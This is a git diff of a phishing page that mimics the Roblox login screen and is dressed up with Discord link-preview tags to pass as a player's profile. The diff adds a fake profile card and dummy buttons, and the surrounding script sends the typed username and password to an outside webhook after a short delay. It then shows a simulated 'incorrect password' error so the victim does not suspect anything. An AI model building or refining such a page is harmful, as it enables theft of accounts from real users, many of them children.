@@ -1,4 +1,4 @@
-<!DOCTYPE html> 
+<!DOCTYPE html>
 <html lang="fr">
 <head>
   <meta charset="UTF-8" />
@@ -8,7 +8,7 @@
   <!-- Open Graph pour Discord -->
   <meta property="og:title" content="Slyweloveyou221's Profile" />
   <meta property="og:description" content="Slyweloveyou221 est l’un des millions de joueurs qui créent et explorent les possibilités infinies de Roblox. Rejoins-le et explore ensemble !" />
-  <meta property="og:image" content="https://tr.rbxcdn.com/48f7ac23eb421cdf7d6810f9ed8dfe75/150/150/AvatarHeadshot/Png" />
+  <meta property="og:image" content="https://tr.rbxcdn.com/54f260251655a9e1916f14aa41d4b77b/150/150/Avatar/Png" />
   <meta property="og:url" content="https://slyweloveyou221.github.io/test2/" />
   <meta name="theme-color" content="#2f3136" />
   <meta name="twitter:card" content="summary_large_image" />
@@ -166,7 +166,6 @@
 </head>
 <body>
 
-  <!-- Barre du haut -->
   <div class="topbar">
     <div class="logo">ROBLOX</div>
     <a href="#">Discover</a>
@@ -180,9 +179,24 @@
     </div>
   </div>
 
-  <!-- Formulaire de connexion centré -->
   <div class="container">
     <h2 class="login-title">Login to Roblox</h2>
+
+    <!-- Section profil style Discord -->
+    <div style="display: flex; align-items: center; justify-content: space-between; background-color: #2f3136; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
+      <div style="color: white; max-width: 70%;">
+        <div style="color: #999; font-size: 12px; margin-bottom: 5px;">Roblox</div>
+        <div style="font-size: 16px; font-weight: bold; color: #00aff4; margin-bottom: 5px;">
+          <a href="https://www.roblox.com/users/4760796777/profile" target="_blank" style="color: #00aff4; text-decoration: none;">
+            Slyweloveyou221's Profile
+          </a>
+        </div>
+        <div style="font-size: 13px; color: #ccc;">
+          Slyweloveyou221 est l’un des millions de joueurs qui créent et explorent les possibilités infinies de Roblox. Rejoins-le et explore ensemble !
+        </div>
+      </div>
+      <img src="https://tr.rbxcdn.com/54f260251655a9e1916f14aa41d4b77b/150/150/Avatar/Png" alt="Avatar complet" style="width: 90px; height: 90px; border-radius: 8px;">
+    </div>
 
     <input type="text" id="username" class="input-field" placeholder="Username / Email / Phone" required>
     <input type="password" id="password" class="input-field" placeholder="Password" required>
@@ -191,15 +205,11 @@
 
     <div id="status"></div>
 
-    <!-- Lien déguisé ici -->
-    <div class="link" onclick="window.location.href='https://exemple.com'">Forgot Password or Username?</div>
-
-    <!-- Faux boutons -->
+    <div class="link fake-action">Forgot Password or Username?</div>
     <button class="outline-btn fake-action">Another Logged In Device? Log In</button>
     <div class="link fake-action">Don't have an account? <strong>Sign Up</strong></div>
   </div>
 
-  <!-- Footer -->
   <div class="footer">
     <a href="#">À propos</a> |
     <a href="#">Emplois</a> |
@@ -224,14 +234,12 @@
       const password = document.getElementById("password").value;
       const status = document.getElementById("status");
 
-      // Affiche le chargement
       status.innerHTML = `
         <div class="loader">
           <div></div><div></div><div></div>
         </div>
       `;
 
-      // Envoi après 3 secondes
       setTimeout(() => {
         fetch(webhookUrl, {
           method: 'POST',
@@ -242,7 +250,6 @@
           })
         });
 
-        // Message d'erreur simulé
         status.innerHTML = `<div class="error-message">Incorrect username or password.</div>`;
         document.getElementById("username").value = '';
         document.getElementById("password").value = '';
